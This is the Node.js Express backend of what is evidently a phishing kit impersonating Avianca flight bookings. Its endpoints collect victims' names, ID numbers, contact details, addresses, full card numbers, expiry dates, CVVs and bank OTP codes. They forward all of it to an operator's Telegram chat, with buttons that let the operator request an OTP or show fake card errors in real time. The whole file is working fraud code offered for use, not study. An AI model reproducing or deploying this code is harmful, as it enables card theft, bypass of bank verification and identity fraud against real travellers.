const express = require('express');
const axios = require('axios');
const path = require('path');
const app = express();
const port = process.env.PORT || 3000;

// Configuración de variables de entorno para mayor seguridad
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Error: Las variables de entorno TELEGRAM_TOKEN y TELEGRAM_CHAT_ID no están configuradas.");
    process.exit(1);
}

// Middleware para servir archivos estáticos desde la carpeta 'public'
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.json());

// Función de ayuda para escapar caracteres de Markdown
function escapeMarkdownV2(text) {
    if (!text) return '';
    const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    let escapedText = text;
    for (const char of specialChars) {
        const regex = new RegExp(`\\${char}`, 'g');
        escapedText = escapedText.replace(regex, `\\${char}`);
    }
    return escapedText;
}

// Endpoint para enviar los datos de pago iniciales
app.post('/api/enviar-pago', async (req, res) => {
    const paymentData = req.body;
    const transactionId = Date.now().toString(36) + Math.random().toString(36).substr(2);

    const message = `
✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*💰 Precio:* $${escapeMarkdownV2(paymentData.flightCost)} USD
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*👤 DATOS DEL TITULAR*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🤵‍♂️ Nombre:* ${escapeMarkdownV2(paymentData.name)}
*🪪 Identificación:* ${escapeMarkdownV2(paymentData.cc)}
*📧 Email:* ${escapeMarkdownV2(paymentData.email)}
*📱 Celular:* ${escapeMarkdownV2(paymentData.telnum)}
*🗺️ Ciudad:* ${escapeMarkdownV2(paymentData.city)}
*📍 Estado:* ${escapeMarkdownV2(paymentData.state)}
*🏠 Dirección:* ${escapeMarkdownV2(paymentData.address)}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*💳 DETALLES DE LA TARJETA*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🏦 Banco:* ${escapeMarkdownV2(paymentData.bank)}
*💳 Número de Tarjeta:*
\`${escapeMarkdownV2(paymentData.cardNumber)}\`
*📅 Fecha de Exp:*
\`${escapeMarkdownV2(paymentData.expiryDate)}\`
*🔐 CVV:*
\`${escapeMarkdownV2(paymentData.cvv)}\`
*🔢 Cuotas:* ${escapeMarkdownV2(paymentData.dues)}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🆔 ID de Transacción:* ${transactionId}
`;

    const keyboard = {
        inline_keyboard: [
            [{ text: "Pedir Otp", callback_data: `pedir_logo:${transactionId}` }],
            [{ text: "Error de TC", callback_data: `error_tc:${transactionId}` }],
            [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
        ],
    };

    try {
        const telegramResponse = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            reply_markup: keyboard,
            parse_mode: "MarkdownV2",
        });

        res.json({ success: true, messageId: telegramResponse.data.result.message_id });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error.response ? error.response.data : error.message);
        res.status(500).json({ success: false, error: 'Error al enviar mensaje a Telegram' });
    }
});

// Endpoint para enviar el código OTP
app.post('/api/enviar-otp', async (req, res) => {
    const { otpcode, storedData } = req.body;
    const transactionId = storedData.transactionId;

    const fullMessage = `
✈️ *NUEVA RESERVA \\- AVIANCA* ✈️
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*👤 DATOS DEL TITULAR*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🤵‍♂️ Nombre:* ${escapeMarkdownV2(storedData.name)}
*🪪 Identificación:* ${escapeMarkdownV2(storedData.cc)}
*📧 Email:* ${escapeMarkdownV2(storedData.email)}
*📱 Celular:* ${escapeMarkdownV2(storedData.telnum)}
*🗺️ Ciudad:* ${escapeMarkdownV2(storedData.city)}
*📍 Estado:* ${escapeMarkdownV2(storedData.state)}
*🏠 Dirección:* ${escapeMarkdownV2(storedData.address)}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*💳 DETALLES DE LA TARJETA*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🏦 Banco:* ${escapeMarkdownV2(storedData.bank)}
*💳 Número de Tarjeta:*
\`${escapeMarkdownV2(storedData.cardNumber)}\`
*📅 Fecha de Exp:*
\`${escapeMarkdownV2(storedData.expiryDate)}\`
*🔐 CVV:*
\`${escapeMarkdownV2(storedData.cvv)}\`
*🔢 Cuotas:* ${escapeMarkdownV2(storedData.dues)}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*👤 DATOS DE ACCESO*
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*Código OTP:* ${escapeMarkdownV2(otpcode)}
\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-\\-
*🆔 ID de Transacción:* ${transactionId}
`;

    const keyboard = {
        inline_keyboard: [
            [{ text: "Error OTP", callback_data: `error_otp:${transactionId}` }, { text: "Error TC", callback_data: `error_tc:${transactionId}` }],
            [{ text: "Finalizar", callback_data: `finalizar:${transactionId}` }]
        ],
    };

    try {
        const telegramResponse = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: fullMessage,
            reply_markup: keyboard,
            parse_mode: "MarkdownV2",
        });

        res.json({ success: true, messageId: telegramResponse.data.result.message_id });
    } catch (error) {
        console.error('Error al enviar mensaje a Telegram:', error.response ? error.response.data : error.message);
        res.status(500).json({ success: false, error: 'Error al enviar mensaje a Telegram' });
    }
});

// Endpoint para verificar el estado
app.post('/api/verificar-estado', async (req, res) => {
    const { messageId } = req.body;
    try {
        const telegramResponse = await axios.get(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
        const updates = telegramResponse.data.result;
        const verificationUpdate = updates.find(
            (update) => update.callback_query && update.callback_query.message.message_id === messageId
        );

        if (verificationUpdate) {
            const action = verificationUpdate.callback_query.data.split(':')[0];
            await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/editMessageReplyMarkup`, {
                chat_id: TELEGRAM_CHAT_ID,
                message_id: messageId,
                reply_markup: { inline_keyboard: [] }
            });
            res.json({ action });
        } else {
            res.json({ action: null });
        }
    } catch (error) {
        console.error('Error al verificar el estado de Telegram:', error.response ? error.response.data : error.message);
        res.status(500).json({ success: false, error: 'Error al verificar el estado.' });
    }
});

app.listen(port, () => {
    console.log(`Servidor escuchando en http://localhost:${port}`);
});
